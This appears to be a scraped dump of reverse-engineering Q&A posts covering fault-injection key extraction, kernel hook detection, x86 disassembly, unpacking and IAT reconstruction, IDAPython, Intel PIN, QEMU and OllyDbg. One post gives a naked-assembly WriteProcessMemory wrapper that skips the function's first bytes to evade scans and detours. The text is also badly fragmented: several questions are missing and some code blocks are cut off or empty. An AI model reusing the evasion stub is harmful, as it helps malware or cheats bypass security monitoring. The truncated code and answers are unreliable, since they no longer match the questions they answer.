<p>More difficult to work around, in the case of the '<em>known error</em>' attack, you can use the output of the chip (<code>output</code> / <code>error</code>) to guess the content of any register you want. You just need to perform attacks always on the same input until you get a normal <code>output</code>, then you can store what you wrote on the register. And, thus, rebuild the value of the key.</p>

<p>Anyway, the cost of circuit redundancy on a chip is quite high, both in money and power-consumption. So, not all the chips can be equipped with this.</p>

<h3>Other Related Attacks and Conclusion</h3>

<p>These attacks have to be compared (or combined) with '<em>side-channel attack</em>'. Both attacks have a different approaches and use different assumptions on what is possible or not. Combining them allow to get way further in extracting information about the device that you study.</p>

<p>Talking now about <strong>software reverse engineering</strong>, I do not know any practical use of fault injection attack nowadays. But, I'm pretty confident that you can use this technique to guess the parameters of a know algorithm that has been obfuscated without having to dissect it in details. Somehow, any debugger can rewrite a register at precise time in the program (breakpoints) with a full control of what is written in the register (we are here in the case of the '<em>fully controlled error</em>' attack). So, this can certainly be used in the case of usual obfuscated programs.</p>

"How does Kernel Detective check if API functions are hooked?","687","","<p>One of the many features of Kernel Detective is the possibility to retrieve the original addresses of the native apis functions implemented in the driver win32k.sys and checking if they are hooked. What are the possible ways to achieve the same ? </p>
","<p>For conventional inline hooks (that just replace the first few bytes of the function), you can simply read the first few bytes of each function to check if it is hooked. Deeper inline hooks will be difficult to detect.</p>

<p>Apart from inline hooks, someone may also hook the SSDT. The SSDT is a table that sits between syscalls from WINAPI's and the kernelmode functions that implement them. The SSDT is indexed by syscall ID and maps each ID to the address of the kernelmode function. This mapping <a href=""http://j00ru.vexillium.org/ntapi/"" rel=""nofollow noreferrer"">remains static</a> for any given service pack for a Windows OS. So it is very easy to figure out what function each syscall ID corresponds to, and thus what function each entry in the SSDT should correspond to.</p>

<p>To detect SSDT hooks and restore original addresses, you could try any of the following:</p>

<p>You could load your program/driver once before the SSDT is hooked, and grab the original addresses. This would be fairly reliable, as long as you load your driver before the hook is in place.</p>

<p>Alternatively, you could download the .pdb file from Microsoft's symbol store and get the original addresses from it using the DIA SDK or DbgHelp API's. This is very reliable as long as a connection is present and nothing is interfering with it. However, this would be quite slow for a .pdb as big as the one for ntoskrnl or win32k.</p>

<p>There are actually two SSDT's, a regular SSDT and a Shadow SSDT. If only the first SSDT is hooked, you could check the values with those in the Shadow SSDT. Or vice versa.</p>

<p>You can check if any entries in the SSDT point to addresses outside the kernel/win32k. This is a very reliable way of detecting the hooks, but it won't easily get you the original address.</p>

<p>Scanning for a byte signature is a somewhat reliable and stealthy way you could locate the original addresses.</p>

<p>There's also a similar question <a href=""https://reverseengineering.stackexchange.com/questions/1461/is-there-an-easy-way-to-detect-if-the-ssdt-has-been-patched-from-a-memory-dump"">here</a></p>

"How to deal with this “lea” instructions generated by objdump?","683","","<p>So basically I am using <code>objdump</code> to disassemble a binary from `GNU Coreutils"", on 32 bit Linux x86.</p>

<p>In the disassembled code, I found one ""broken"" instruction like this:</p>

I am quite confused..</p>

<p>Could anyone give me some help?</p>
","<p>I don't know what makes you think this instruction is ""broken"" - the fact that there is a comma right after a bracket, without a parameter in between? In this case, the disassembler just doesn't show the parameter because it's ""zero"" (more precisely, it specifies ""no register"" where ""any processor register"" would be allowed).</p>

<p>What happens here is: when addressing memory locations, the processor has a mode where it adresses </p>

<ul>
<li>a base offset</li>
<li>plus the content of one processor register</li>
<li>plus the content of another processor register, multiplied by an integer that can be 1,2,4 or 8</li>
</ul>

<p>This calculation is quite fast, as it's done in special hardware in the address bus subsystem.</p>

<p>The <code>lea</code> (load effective address) instruction is a special kind of RAM access -- it calculates the address of the operand, but then, it moves the <em>address</em>, not the data at that address, into the destination register.</p>

<p>So your 'broken' instruction moves a base offset of 0, plus ""no"" first register, plus 8 times the content of ebp, into eax. The same could have been done by moving ebp to eax and multiplying by 8, or moving and shifting left by 3 bits, but the <code>lea</code> instruction is probably a bit faster (because, as i said, it's done in specialized address bus hardware), so the compiler used that one to save a few cycles. Nothing is broken here.</p>

<p>You might want to take a look at a i386 assembler reference when disassembling, the indirect adressing is quite well explained in the <a href=""https://developer.apple.com/library/mac/documentation/DeveloperTools/Reference/Assembler/060-i386_Addressing_Modes_and_Assembler_Instructions/i386_intructions.html"" rel=""nofollow"">OS X Assembler reference</a>, scroll down to ""Indirect Memory Operands"".</p>

<p>I launch the Calculator.app, then I start lldb from a Terminal window.  I find the process of the Calculator.app using ps and grep.  I attach to the running process using LLDB.  I then issue the <code>continue</code> command in LLDB to allow the Calculator.app to continue running.</p>

<p>I type the following command into LLDB,
<code>(lldb) breakpoint set --method showAbout</code></p>

<p>However when I click <code>About Calculator</code> from the menu bar it doesn't halt the program, but rather shows the About dialog box for the Calculator.</p>

To find the ASLR slide you can use my tool called <a href=""https://github.com/Tyilo/get_aslr"" rel=""nofollow"">get_aslr</a>, like so:</p>

<pre><code>$ sudo get_aslr $(pgrep Calculator)

","<blockquote>
  <p>But how does knowing OEP relate to IAT?</p>
</blockquote>

<p>OEP does not relate to the IAT, but is used by import reconstruction tools to find the location of IAT-like structures created by the packer.</p>

<blockquote>
  <p>When application is unpacked in memory, can't we get pointer to IAT just by walking through PE header</p>
</blockquote>

<p>This is exactly why import reconstruction is needed. Because the malware <em>intentionally</em> ruins the IAT in some way or another, only keeping a small set of mandatory functions in it, leaving the work of resolving most of the APIs as part of the unpacking code. Therefore import reconstruction will require we find the IAT by other means (because the PE defined IAT is incomplete/fake).</p>

<blockquote>
  <p>Why don't we dump application not at OEP but say on jmp leading to OEP? Or one-two instructions after OEP?</p>
</blockquote>

<p>When dumping, it is import to have executed all code related to descrambling the packed code. Otherwise, OEP might not be valid executable code. Other than that (and import reconstruction related issues) it is perfectly fine to dump and just adjust the PE's Entry Point to the OEP. Most dumping tools will allow that.</p>

<hr>

<p>Aside from answering your specific questions, here are the types of packers with regard to their IAT manipulation and what's needed to get a functional IAT in a dumped PE:</p>

<ol>
<li><p>When a packer does not change the original import table, import reconstruction is unnecessary. Most PE dumpers will copy the original import table when it's valid or dump it with the PE.</p></li>
<li><p>Some packers carry another PE that is hidden at first, and only decrypt/descramble it in it's entirety. Those packers will also carry the IAT in-tact and most dumpers will get the IAT automatically. </p></li>
<li><p>Some packers will create their own alternative IAT and implement their own version of API loading/resolving. For those packers, an import reconstruction utility will need to locate that alternative (or, shall we say real?) IAT and create a new IAT in the reconstructed PE from scratch (based on those APIs actually pointed by the original IAT). Import reconstruction will then find ranges of ""IAT looking"" offsets and make sure they reside in the same location when the PE is loaded. The OEP is therefore scanned for calls that use offset tables that might be suspected as being such an alternative IAT.</p></li>
<li><p>Some packers will not create a single IAT, but instead many small IAT tables, such that you would no longer call them ""Tables"". In those cases, the import reconstruction tool <em>must</em> encounter enough of those small tables and reconstruct each of them separately. In those cases it is even more important not to leave any piece of code still packed, as APIs only used by those pieces of code will not be reconstructed.</p></li>
<li><p>Another type of packers make it even harder to resolve APIs for static disassembly (although do not prevent execution of the dumped PE) by dropping the concept of import tables and instead resolve the API requested every time an API call is made. This is usually done by assigning a key/hash that is not trivially recognizable to any API, and walk over DLLs and Export tables every time a call is made, generating the same key/hash for APIs until the correct key is found.
This usually mean import reconstruction is not needed to execute and debug the dumped PE, but a human reverse engineer will have difficulties understanding which APIs are being called.</p></li>

"IDAPython Strings constantly returns NoneType with str()","665","","<p>I'm trying to automate  disassembly of a firmware image using IDA Pro 6.5 and IDA Python. One of the process I want to implement is to locate strings and create a data segment around them.</p>

<p>Using the GUI, I have little issue doing so. However when using the <a href=""https://www.hex-rays.com/products/ida/support/idapython_docs/idautils.Strings.StringItem-class.html"" rel=""nofollow""><code>idautils.Strings()</code></a> API call, I can retrieve a list of <code>StringItem</code> objects, but I fail to access the actual string data with <code>str()</code> or <code>unicode()</code>. Below is the failing function, which is taken from <a href=""https://code.google.com/p/idapython/source/browse/trunk/examples/ex_strings.py?r=344"" rel=""nofollow"">IDA Python Google Code archive</a>:</p>

<pre><code>def find_strings():

    for i, v in enumerate(s):
        if v is None:

        else:
            print(""%x: len=%d type=%d index=%d-&gt; '%s'"" % (v.ea, v.length, v.type, i, str(v)))
</code></pre>

<p>When ran into IDA, the following error is reported:</p>

  File ""&lt;string&gt;"", line 1, in &lt;module&gt;
  File ""&lt;string&gt;"", line 8, in find_strings

<p>When replacing the <code>str(v)</code> argument with the constant <code>aaa</code> in the <code>print</code> function, I get a list of <code>StringItem</code> objects without any problem:</p>

<pre><code>Python&gt;find_strings()

<p>From my understanding, it seems that the <code>StringItem</code> contains no strings for an unknown reason (or an issue with the plugin, specific version of Python maybe?), however they are displayed in the GUI.</p>

<p>I'm seeking advice on either what I'm doing wrong, or an alternative way to extract the strings using the IDApython plugin. Thanks</p>

<h2>Updates</h2>

<p>The code above appears valid after adding the missing parenthesis as mentioned in the comments. However this was only a typo in the post and not the source of the issue. The <code>find_strings</code> worked fine in other typical binaries. Further proof is that by using the <code>idc.GetString(self.ea, self.length, self.type)</code> also returned <code>NoneType</code>.</p>

<p>Diff mentioned that the <code>get_ascii_contents2</code> is failing and thus returning <code>null</code>, which is very likely the cause. What is unclear is why the function is failing, while the GUI succeeds in locating most of the strings.</p>

<p>The first string at 0x208E is a trash Unicode string. The string at 0x21B0 is an actual ASCII string composed of 37 chars. I cannot post the complete string due to disclosure/legal issues. Notice that when displayed in the hex editor, the byte order of the ASCII view is inverted for an unknown reason. The bitness of the overall firmware is 16bit.</p>

<p><code>434F 5059 5249 4748 5420 A920 ... 4544 2000 0000 : OCYPIRHG T ¬ ... DE.</code></p>

<p>Finally, note that the function <code>MakeStr</code> works without any issue. I have the following code, when used at 0x21B0, will successfully create a string within a data segment:</p>

<pre><code>def create_string(self, _startea, _endea, _segname="".const"", _unicode=False):

        if (SegStart(_startea) == idc.BADADDR):
            self.create_data_segment(_startea, _endea, "".const"")
        else:
            segtype = GetSegmentAttr(_startea, SEGATTR_TYPE)
            if (segtype != IDAEngine.SEG_TYPE_DATA):
                DelSeg(_startea, 0)
                self.create_data_segment(_startea, _endea, _segname)

        result = MakeStr(_startea, _endea)
        if (result == IDAEngine.FAIL):
            print ""[-] Failed to create a string at 0x{:x} to 0x{:x}."".format(_startea, _endea)
</code></pre>

<p>At this point, I believe the structure of the firmware is to blame (combination of bitness, lack of symbols and an obsolete but supported microprocessor), however I couldn't pinpoint the exact issue. For now, since I can use <code>find_strings()</code> to retrieve the offsets and then use <code>MakeStr</code> on strings with a certain length and the manually vetting the ""real"" strings. </p>

<h2>Final Remarks</h2>

<p>For posterity, I never really solved the issue, however I can confirm the underlying binary file was responsible for raising an exception in <code>get_ascii_contents2</code>. I've reloaded the same file, however as a raw binary file in one large segment and the function worked flawlessly. </p>

"Intel PIN: How to access the INS object from inside an analysis function?","664","","<p>A typical PIN code snippet looks like this (taken from the <a href=""https://software.intel.com/sites/landingpage/pintool/docs/76991/Pin/html/index.html#IAddressTrace"" rel=""nofollow"">official manual</a>):</p>

<pre><code>// This function is called before every instruction is executed

}
</code></pre>

<p>I just can't figure out how to access the <code>ins</code> object from within <code>printip(VOID *p)</code>. The other way round seems easy, i.e. getting the IP from from the <code>ins</code> object:</p>

<p><code>INS_Address (INS ins)</code>(see <a href=""https://software.intel.com/sites/landingpage/pintool/docs/76991/Pin/html/group__INS__BASIC__API__GEN__IA32.html#gd3b5f975c84b126531b38930b94b5544"" rel=""nofollow"">here</a>)</p>

<p>I tried passing a <code>INS *ins</code> pointer to <code>printip(VOID *ip, INS *ins)</code> ins via <code>IARG_PTR, &amp;ins</code> but this ended in either casting errors or Segmentation faults.</p>

<p>How can I access the <code>ins</code> object (type <code>INS</code>) from inside an analysis function?</p>

<p><strong>Side note:</strong> I got to this problem when trying to call <code>INS_Disassemble (INS ins)</code> for every executed instruction.</p>
","<p>You may note that <code>printip</code> is a function pointer, it is lazily called internally by <code>Pin</code>; moreover <code>ins</code> is an <em>automatic variable</em> (it is passed into <code>Instruction</code> from the stack). Consequently, passing <code>&amp;ins</code> into <code>printip</code> (through <code>IARG_PTR</code>), then using it will lead to segmentation faults.</p>

<p><code>Pin</code> declares <code>INS</code> by specializing the class template <code>INDEX</code>, as you can observe the following declaration in <code>type_core.TLH</code>:</p>

<pre><code>/*! @ingroup INS_BASIC_API
Handle for INS */  
typedef class INDEX&lt;6&gt; INS;
</code></pre>

<p>where <em>constructors and assignment operators</em> of class template <code>INDEX</code> are both default. So, <em>in principle</em>^^, we can always declare a persistent variable to share an object of <code>INS</code> between instrumentation and analysis functions, for example:</p>

<pre><code>static INS per_ins;
...
VOID Instruction(INS ins, VOID *v)
{
  per_ins = ins;
  ...
}
...
VOID printip(VOID *ip)
{
  INS_Disassemble(per_ins);
}
</code></pre>

<p>This method does not work, unfortunately, this is an example for ""well-typed program still can go wrong"" in <code>C/C++</code>^^. Since <code>Pin</code> does not guarantee that internal variables, accessed by an object of type <code>INS</code>, are persistent in <em>analysis time</em>, the result of calling <code>INS_Disassemble(per_ins)</code> in an <em>analysis function</em> can be meaningless.</p>

<p>For your case, you may not want to call <code>INS_Disassemble(ins)</code> each time <code>ins</code> executes. We don't need that, for example, if <code>ins</code> is in a loop then this function will be called multiple times (with the same <code>ins</code>) to get the same result.</p>

<p>All <strong>static information</strong> of an instruction (e.g. the disassembled form of <code>ins</code> in this case) should be obtained in <em>instrumentation time</em>. Particularly, <code>INS_Disassemble</code> should be called single time only in some instrumentation function. One way to obtain the same effect as you want is:</p>

<pre><code>static std::unordered_map&lt;ADDRINT, std::string&gt; str_of_ins_at;

VOID Instruction(INS ins, VOID *v)
{
  str_of_ins_at[INS_Address(ins)] = INS_Disassemble(ins);

<p>So my question would be : Is that sketch ok? I wanted to ask because the point that Argument 2 is pushed twice and Argument 1 is not taken surprises me </p>
","<p>Your code snippet does not contain <code>push esp, ebp</code>, so why would there be an ""old EBP"" on the stack? At the beginning of the function, your stack should look like this:</p>

esp + 04 | Argument 1 (arg_0)
esp + 08 | Argument 2 (arg_4)
esp + 0C | Argument 3 (arg_8)

<p>After that, remember that <code>esp</code> changes after each <code>push</code>. IDA is already doing the maths for you and splitting the displacement into the <code>+4</code> and <code>+arg_4</code> parts — they represent ""balance <code>esp</code> back to its initial value"" and ""convert the remaining offset to a local variable"", respectively. The function is pushing exactly those variables which are referenced:</p>

<pre><code>push    [esp+arg_8]      ; Argument 3
push    [esp+4+arg_4]    ; Argument 2
push    15
push    [esp+0Ch+arg_0]  ; Argument 1
</code></pre>

<hr>

<p>If you want to find out more, you can highlight the <code>[esp+4+arg_4]</code> part in the disassembly and press <kbd>Q</kbd> to convert the displacement to a single number.</p>

<p>Then go to Options > General... > Disassembly and enable the <code>Display disassembly line parts: [x] Stack pointer</code> setting. </p>

<p>Now you see the difference between the <code>esp</code> value at the start of the function and the <code>esp</code> value in the current line.</p>

<p>Subtract that difference from the displacement in the <code>push</code>, and you should get the right local variable.</p>

<p>For a reverse engineer who is moderately skilled, what is an estimate on the time it might take such an engineer to go through the assembly and understand how the app works.</p>

<p>edit: To add more constraint, what I mean by ""understand how the app works"", I mean, know it well enough to create a near replica of the application using mostly the same implementation details. Flappy bird is a bad example because you can play it and you already have an idea of what it does. Pretend you don't know how it works.</p>
","<p>The amount of time needed to understand assembly code does not grow linear. For example: You can understand a simple function with 10 lines of assembly relatively quickly (lets say 4-5 minutes). As the code grows the more complex it is to understand the code: You need to catch how different functions work together, so the equation does not result in 8-10 minutes.</p>

<p>As L. Resnik made clear the amount of time vastly depends on the complexity of the code, but this is roughly the same for every standard application I would say. </p>

For example, using chrome's devtool (<kbd>ctrl</kbd>+<kbd>shift</kbd>+<kbd>I</kbd>), it does not show any <code>CONNECT</code> methods or connections to <code>googleapis.com</code> even though tcpcatcher clearly captures that during geolocation.</li>
<li>I've tried looking at the source to determine this but not having much luck.

"Ida Plugin Batch analysis issue.","662","","<p>I overcame recent issues with a redefinition and finished my Plugin.</p>

<p>In short this plugin uses Hex-Rays Decompiler to decompile a given file, analyzes properties of the pseudocode and then appends the results to a <code>.csv</code></p>

"GAS/x86 disassembled a bare gs register as an instruction, is it a bug?","660","","<p>I encountered a strange x86-32 instruction (opcode <code>0x65</code>) decoded by <code>objdump</code> as <code>gs</code> (not <code>%gs</code> but <code>gs</code>). I found it while a full linear sweep of a binary (<code>objdump -D</code>), so the decoding was surely incorrect. But, still, <code>objdump</code> didn't decode it as a <code>(bad)</code> instruction, so it means that it can be encountered and I would like to know what does it means.</p>

<p>Here is an example of this instruction:</p>

<pre><code>080484fc &lt;_IO_stdin_used&gt;:

<p>Note that searching for this instruction on the Web is quite difficult because of the <code>%gs</code> register which mask all other possible hit.</p>

<p>So, is it a real ""instruction"" or is it glitch produced by <code>gas</code> ?</p>
","<p>Strictly speaking it's not an instruction. It's the segment override prefix (prefixes are considered to be part of the instruction).</p>

<p>Most memory accesses use <code>DS</code> segment selector by default except those involving <code>ESP</code> or <code>EBP</code> register (they default to <code>SS</code>) and some ""string"" instructions (<code>movs</code>, <code>scas</code> etc). Segment override prefixes allow you to use another segment selector to access your data. E.g. in DOS times the <code>CS</code> override was commonly used to access data stored in the code segment (such as jump tables):</p>

<pre><code>seg001:00EA shl bx, 1 ; SWITCH
seg001:00EC jmp cs:off_13158[bx] ; switch jump
...
seg001:0588 off_13158  dw offset loc_12DD7 ; DATA XREF: _main+E6r
seg001:0588            dw offset loc_12DE5 ; jump table for switch statement
seg001:0588            dw offset loc_12DE5
seg001:0588            dw offset loc_12DE5
</code></pre>

<p>The 80386 added two extra segment registers (<code>GS</code> and <code>FS</code>) and the corresponding prefixes.</p>

<p>Since the <code>GS</code> prefix does not actually affect the following instruction (<code>insb</code>) in the code snipped above, GAS opted out for printing it on a separate line.</p>

<p>In some of the following instructions you can see how it affects the disassembly:</p>

<pre><code>64 21 0a       -&gt;  and %ecx, %fs:(%edx)
^^                           ^^^
67 65 20 54 68 -&gt; and %dl, %gs:0x68(%si)
   ^^                      ^^^
</code></pre>

<p>BTW, 67 is another prefix, this time the <em>address size</em> override. It is why the instruction uses the 16-bit <code>SI</code> register and not the full <code>ESI</code>.</p>

"How could using QEMU be useful in developing a driver for Linux?","657","","<p>Presently, I am trying to analyze a piece of hardware, to be specific the Broadcom 1570 PCI web cam inside a late MBPr 2013.  I can pass through the device using QEMU, and have the gusest OS / VM detect the web cam, and I tested it out using FaceTime, and it appears to be working.  However, there currently isn't a Linux driver for this device.  I am aware of one being developed, and there is a project page on Github for the device.</p>

<p>What are some ""attack vectors"" or possibilities of using qemu to aid in the development of a Linux driver for this device?  My knowledge with QEMU is limited, but I have successfully set up several VM's on my host Linux machince (MBPr), and I am eager to learn.  Any help would be greatly appreciated.</p>
","<p>To develop a driver, there's basically 3 steps you have to do:</p>

<ol>
<li>Learn about Linux driver programming in general. This is independent of your specifi hardware, and involves things like ""How do i convert virtual memory addresses to physical and back? How do i read bytes / write bytes to hardware registers? How do i yield the CPU while waiting for the hardware to set a bit? If the device is interrupt-driven, how to i ""stop"" execution of the driver when it has written a command to the device, and how to i ""restart"" it when the device uses an interrupt to tell me the command has finished/data is ready for me to process?</li>
<li>Learn how the hardware works. How many and which registers does it have, what's the meaning of the individual bits of those registers, what do i have to write to which register to configure the hardware, how (in the case of a web cam) do i read a pixel from the hardware, and how do i set up a DMA transfer of a whole image to memory?</li>
<li>Apply the knowledge of 1) and 2) to your hardware, write a driver, and debug it if it doesn't work as it should. If your user level software tells the driver to configure the Webcam to 1024x768 pixels, does the driver write the correct data to the correct registers? Does it obey any timing the device imposes, or does it set your registers too fast sometimes?</li>
</ol>

<p>While 1) ist just a lot of reading and understanding documentation, an emulator might be able to help with 2), and certainly with 3).</p>

<p><strong>Learn how the hardware works</strong></p>

<p>If you're lucky, you can do 2) looking at vendor's datasheets. In your case, it seems like the vendor (Broadcom) hasn't published anything, so the only way to find out is looking at what an existing driver does. This is where an emulator <strong>that allows logging of certain actions</strong> might come handy.</p>

<p>If you're running MacOS under Qemu under Linux, and the MacOS driver accesses the webcam hardware, then it doesn't really access the hardware. Every hardware access goes to Qemu, which will intercept the access and route it to the real hardware. Each of these actions can be logged. Now, you can fire up some software in your MacOS, and, for example, tell it to set the resolution to 1024x768 pixels. This might result in a QEMU log like this:</p>

<pre><code>Write the value 01 to the memory address 1234500
Read memory address 1234501 and get 0x80
Read memory address 1234501 and get 0x80
Read memory address 1234501 and get 0x80
Read memory address 1234501 and get 0x00
Write the value 00 to the memory address 1234502
Write the value 04 to the memory address 1234503
Read memory address 1234501 and get 0x80
Read memory address 1234501 and get 0x00
Write the value 02 to the memory address 1234500
Read memory address 1234501 and get 0x80
Read memory address 1234501 and get 0x80
Read memory address 1234501 and get 0x80
Read memory address 1234501 and get 0x80
Read memory address 1234501 and get 0x00
Write the value 00 to the memory address 1234502
Write the value 03 to the memory address 1234503
Read memory address 1234501 and get 0x80
Read memory address 1234501 and get 0x00
Write the value 00 to the memory address 1234500
</code></pre>

<p>What does this tell us?</p>

<p>Well, your resolution values - 1024x768 - are 0400 and 0300 in hex. This corresponds to the bytes that are written to 1234502 and 1234503. So, these seem to be the registers that set the resolution. But unfortunately, the <em>same</em> registers seem to be used for width and height. This probably means that the byte written to 1234500 is a selector - writing a 1 there turns the other 2 registers into ""height"" mode, writing a 2 turns them into ""width"" mode.</p>

<p>And what about the repeated reading of 1234501?</p>

<p>Every time, after something is written to the device, bit 7 (0x80) of that register seems to be set, and the driver keeps reading it until it's clear; then proceeds to write some more. So it seems that bit is a ""hardware ready"" bit, meaning the hardware is processing your previous commands, and not able to accept further commands. Once everything is processed, the bit gets cleared, and the driver is allowed to write some more.</p>

<p>Of course, all of this would be much easier if you had documentation of the actual hardware. But, documentation of <em>similar</em> hardware might still help. Assume there was a different chip, the Broadcom 1571, which had a USB interface. And assume the documentation of that stated ""To set the resolution to 1024x768, you'll have to send the bytes <code>0x01 0x00 0x04 0x02 0x00 0x03 0x00</code> over USB"". You'd see that the byte sequence is the same, but the timing stuff is probably handled by the USB controller of the 1571 Chip. So you could easily translate the instruction ""To turn on the LED, send <code>0x04 0x01 0x00</code>, to turn it off send <code>0x04 0x00 0x00</code>"" to the corresponding PCI register sequence, and verify using your QEMU log whether or not the driver does the same thing when you turn the LED on/off from your emulated software.</p>

<p><strong>Develop the driver</strong></p>

<p>Once you have enough information about the hardware, you can start writing the linux driver. At this point, an emulator can help you in the same way as when you were tracing the other driver - running Linux with your driver in an emulator helps you debugging the code in just the same way as when you were tracing the original driver.</p>

<p>Also, you can use the emulator to prevent lots of crashes. Your driver might have some bugs that cause it to write bad data to bad addresses, and you certainly want to prevent it from sending a low level format command to the PCI/SATA adapter. You can for example, use QEMU to pass through only a specific range of PCI registers to the actual hardware. Or, if your device documentation states ""Writing 0x01 to Register 7 sets a signal to ground, writing 0x02 sets it to +5V. Never set both bits at once, this will create a short circuit and fry your device within seconds"", you could put an appropriate safeguard into the emulator to prevent this in case of a driver gone wild.</p>

<p><strong>Can Qemu actually do what has been described?</strong></p>

<p>Probably not the vanilla version. There's no reference to PCI register logging in the qemu description. But, it seems that <a href=""https://github.com/koradlow/v4l2-rds-ctl/tree/master/contrib/pci_traffic"" rel=""nofollow"">there is a project on github to add this kind of logging to qemu</a>. This project hasn't been updated in 4 years, which could mean it still works as intended (and there has never been a reason to update it), or the maintainer lost interest and it doesn't work at all anymore.</p>

<p>Some of the other uses described are just too specific to be easily configurable, so you'll probably need to hack qemu itself to implement them. But hey, that's what qemu is open source for.</p>

<p>Since there is already a project to develop drivers for your camera, chances are the maintainers of that project have done exactly that. I'd contact them for more information.</p>

","<p>You should disable /DEBUG (linker option), which is enabled by default even for Release configurations.</p>

"Why does WriteProcessMemory in kernel32.dll do this? (ASM)","657","","<p>Someone said to do something like this to avoid scans for WPM calls: </p>

<pre><code>__declspec(naked) BOOL WINAPI SafeWriteProcessMemory(HANDLE hProcess,
    LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize,
    SIZE_T *lpNumberOfBytesRead)

    __asm

            push ebp

            mov eax, WriteProcessMemory
            add eax, 6
            jmp eax
    }
}
</code></pre>

<p>I put it in a program and debugged it in olly. I looked at <code>kernel32.WriteProcessMemory</code>. We're using the <code>add eax, 6</code> to jump from here:</p>

<pre><code>MOV EDI,EDI                              ; BOOL kernel32.WriteProcessMemory(hProcess, ...)
PUSH EBP
MOV EBP,ESP
POP EBP
JMP &lt;JMP.&amp;API-MS-Win-Core-Memory-L1-1-0. ; Jump to KERNELBASE.WriteProcessMemory
</code></pre>

<p>To there. Effectively skipping over the instructions between the two. We're executing those instructions in our own call. But I don't understand why those instructions are being executed. We're pushing <code>EBP</code> onto the stack, moving <code>ESP</code> into <code>EBP</code>, then restoring <code>EBP</code> from the stack. That shouldn't actually be doing anything.</p>

<p>I debugged it instruction-by-instruction, and still can't figure out why it's being done.</p>

<p>Does it have something to do with Windows' useless <code>mov edi,edi</code>s at the beginning of functions to allow jump patching?</p>
","<p>This is the ""stolen bytes"" technique, where the first few bytes of the function are copied to a remote location and executed from there, then the original function is called from the location after the bytes that were copied.</p>

<p>The purpose of skipping the first few bytes of the function allows you to call the function body without being ""detected"".  That is, any code which detoured the function at exactly the start would be bypassed.</p>

<p>In your example, the EBP manipulation is meaningless.  Those instructions exist in the original function in order to provide a familiar signature for routines that, for example, detour the code (but which is presumably broken by also including the hot-patching support).  Note that the POP instruction did not exist in that location before Windows 7, with the introduction of the kernelbase.dll.  Previously, the real function body would have followed the MOV instruction.</p>

","<p>Different AV vendors use different naming conventions. Many of them describe these conventions on their websites. For example:</p>

<ul>
<li><a href=""http://www.microsoft.com/security/portal/mmpc/shared/malwarenaming.aspx"">http://www.microsoft.com/security/portal/mmpc/shared/malwarenaming.aspx</a></li>

<li><a href=""http://www.avira.com/en/support-malware-naming-conventions"">http://www.avira.com/en/support-malware-naming-conventions</a></li>
</ul>

<p>AV vendors will sometimes try to use the same names as other AV vendors for well-known malware families, but this is not guaranteed and is becoming less and less common. For example, Microsoft, Sophos, CA, and McAfee all refer to the well-known Conficker family as ""Conficker"", but Symantec refers to it as ""Downadup"".</p>

<p>Even when AV vendors agree on a family name, they will hardly ever be in-sync on variant names. So for example, a file detected by Microsoft as Conficker.B might be detected by CA as Conficker.C.</p>

<p>This is why whenever you want to refer to a specific malware variant, it's always best to give the detection name <em>and</em> the AV engine name. Or better yet, just give the file hash and let people look it up on a site like VirusTotal.</p>

"Ollydbg:how to let Olly remember a breakpoint for next run","654","","<p>I'm a Olly newbie... whenever I set a breakpoint at an address and found I need to restart the target program, the previously set breakpoints are all removed. Is there anyway to let Olly to remember the breakpoints for certain executable, so that everytime when I want to debug that executable, the previously set breakpoints are still there?</p>
","<p>This is a limitation of OllyDbg v1.</p>

<p>There are a couple of plugins designed to fix this in v1 (such as <a href=""http://www.openrce.org/downloads/details/168/Breakpoint_Manager"" rel=""nofollow"">Breakpoint Manager</a>), but the better solution is to upgrade to <a href=""http://www.ollydbg.de/odbg201.zip"" rel=""nofollow"">OllyDbg v2</a>.</p>

"What is the current state of the art for platform modeling?","653","","<p>When we're doing reverse engineering, we have a few levels of models. One of them is the instruction semantics model, which tells us what every native instruction does to modify instruction state. We're making progress there. However, another problem is that of platform semantics, which is at a higher level. </p>

<p>For example, a high-level model of a userspace linux program would need to include information about mprotect and that it can alter the visibility of certain regions of code. Threading and callback semantics are also a platform modeling issue, we can discover a programs entrypoint from its header (which is another kind of semantic! but one we're probably not going to compromise on), but other entrypoints are published in the program in the form of arguments to atexit, pthread_create, etc. </p>

<p>What is our current best effort/state of the art at capturing this high level platform information in a way that is understood by practicioners? What about by mechanical / automated understanding systems? I know that IDA has (or has to have) information about different platform APIs, it seems to know that when an immediate is a parameter to pthread_create then that immediate is a pointer to code and should be treated as such. What do we have beyond that?</p>
","<h2>Direct Detection</h2>

<p>At the lowest level you can just have copies of the libraries and check if they are the one used. </p>

<h2>Signature based Detection</h2>

<p>At a higher level than that is <a href=""https://www.hex-rays.com/products/ida/tech/flirt/index.shtml"">IDA FLIRT</a> which stores just enough information about a library to identify its use. But its main benefit is reduced disk usage... it is worth noting that you can add more definitions to the default ones.</p>

<p>Hex-Rays talks about the technology <a href=""https://www.hex-rays.com/products/ida/tech/flirt/in_depth.shtml#implementation"">in-depth here</a>.</p>

<h2>Generic recognition</h2>

<p>Tools like Coverity or the <a href=""http://clang-analyzer.llvm.org/"">Clang static analyzer</a> or <a href=""http://klee.llvm.org/"">KLEE</a> are more general and more likely to include models for programming idioms.</p>

<p>The only thing I know of coming close to IDA that is open source is <a href=""https://github.com/radare/radare2"">radare</a> which might have some library recognition. Also <a href=""http://www.radare.org/""><code>radare</code>'s main page</a>. And I have been looking since I am hunting something like IDA that supports SPARC for free and it looks like <code>radare</code> does although I haven't had time it give it a go yet.</p>

<p>From what I can tell REC and Boomerang do not recognize libraries the way IDA does, but instead just attempt to decompile everything. <a href=""http://bap.ece.cmu.edu/"">BAP</a> does analysis of binaries and is derived from the Vine component of the BitBlaze project the two projects below are part of as well.</p>

<h2>Flow Analysis</h2>

<p>TEMU and Rudder <a href=""http://bitblaze.cs.berkeley.edu/#projects"">here</a> look to be quite advanced. And deal with code as it executes. TEMU helps to relate imputs and outputs to the flow. </p>

<p>It is also worth noting that the Bitblaze tools are designed to provide traces for use in IDA although they could probably be adapted for use otherwise.</p>

<p>Going off of the specifics you provided <a href=""http://bitblaze.cs.berkeley.edu/temu.html"">TEMU</a> sounds the closest to what you want.... it allows you to mark tainted inputs (memory locations, physical inputs etc...) and detect the effects of those taints on the execution. If you want to try out TEMU and are on a newer Linux distro (anything with GCC 4+ which is most anything in the past few years) follow the <a href=""https://groups.google.com/forum/?fromgroups#!topic/bitblaze-users/QdoY9l8D-ho"">instructions here</a>.</p>

